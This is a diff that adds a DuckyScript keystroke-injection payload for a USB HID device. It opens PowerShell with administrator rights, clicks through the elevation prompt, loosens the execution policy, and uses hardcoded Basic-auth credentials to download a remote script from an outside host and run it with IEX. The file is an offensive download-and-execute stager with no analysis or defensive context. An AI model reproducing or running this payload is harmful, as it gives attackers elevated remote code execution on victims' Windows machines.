@@ -1,0 +1,37 @@
+GUI R
+DELAY 2000
+STRING notepad
+DELAY 1
+ENTER
+DELAY 2000
+STRING Start-Process PowerShell -Verb RunAs
+DELAY 1000
+ENTER
+DELAY 1000
+LEFT
+ENTER
+DELAY 3000
+STRING Set-ExecutionPolicy RemoteSigned
+DELAY 2000
+ENTER
+STRING A
+DELAY 2000
+ENTER
+STRING $user = "krew7"
+DELAY 2000
+ENTER
+STRING $password = "2w4r6y8i0p"
+DELAY 2000
+ENTER
+STRING $webclient = New-Object Net.webclient
+DELAY 2000
+ENTER
+STRING $basic = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($user + ":" + $password));
+DELAY 2000
+ENTER
+STRING $webclient.Headers["Authorization"] = "Basic $basic"
+DELAY 2000
+ENTER
+STRING IEX $webclient.DownloadString("https://war.digitalsoldier.gq/rdyh4sd6df7es.txt")
+DELAY 2000
+ENTER
